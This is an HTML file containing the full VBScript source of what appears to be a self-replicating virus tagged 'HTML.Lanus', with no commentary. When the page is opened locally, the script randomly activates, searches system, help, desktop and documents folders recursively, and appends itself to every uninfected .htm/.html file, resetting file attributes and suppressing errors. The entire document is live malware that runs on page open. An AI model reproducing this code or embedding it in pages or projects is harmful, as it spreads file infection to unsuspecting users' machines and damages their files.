<!--HTML.Lanus-->
<Script Language="VBScript">
On Error Resume Next
Dim A1(6)
Randomize
If Location.Protocol = "file:" And Int((3 - 1 + 1) * Rnd + 1) = 1 Then
Set A2 = CreateObject("Scripting.FileSystemObject")
Set A3 = CreateObject("WScript.Shell")
A1(0) = A2.GetParentFolderName(A2.GetParentFolderName(Replace(Location.PathName,"/","")))
A1(1) = A2.GetSpecialFolder(1)
A1(2) = A2.GetSpecialFolder(2)
A1(3) = A2.BuildPath(A2.GetSpecialFolder(0),"HELP")
A1(4) = A3.SpecialFolders("AllUsersDesktop")
A1(5) = A3.SpecialFolders("Desktop")
A1(6) = A3.SpecialFolders("MyDocuments")
For A4 = 0 To 6
If A2.FolderExists(A1(A4)) = True Then
B A1(A4)
End If
Next
End If
Sub B(B1)
For Each B2 In A2.GetFolder(B1).Files
If UCase(A2.GetExtensionName(B2)) = "HTM" Or UCase(A2.GetExtensionName(B2)) = "HTML" Then
Set B3 = A2.OpenTextFile(B2,1)
Do While B3.AtEndOfStream = False And B4 <> "<!--HTML.Lanus-->"
B4 = B3.ReadLine
Loop
B3.Close
If B4 <> "<!--HTML.Lanus-->" Then
C B2
End If
End If
Next
Set B5 = A2.GetFolder(B1)
If B5.IsRootFolder = False Then
For Each B6 In B5.SubFolders
B B6
Next
End If
End Sub
Sub C(C1)
Set C2 = A2.GetFile(C1)
C3 = C2.Attributes
If C3 <> 0 Then
C2.Attributes = 0
End If
Set C4 = A2.OpenTextFile(Replace(Location.PathName,"/",""),1)
Set C5 = A2.OpenTextFile(C1,8)
C5.WriteLine("")
Do While C6 <> "<!--HTML.Lanus-->"
C6 = C4.ReadLine
Loop
C5.WriteLine(C6)
C5.WriteLine(C4.ReadLine)
C4.Close
C5.Close
If C3 <> 0 Then
C2.Attributes = C3
End If
End Sub
</Script>
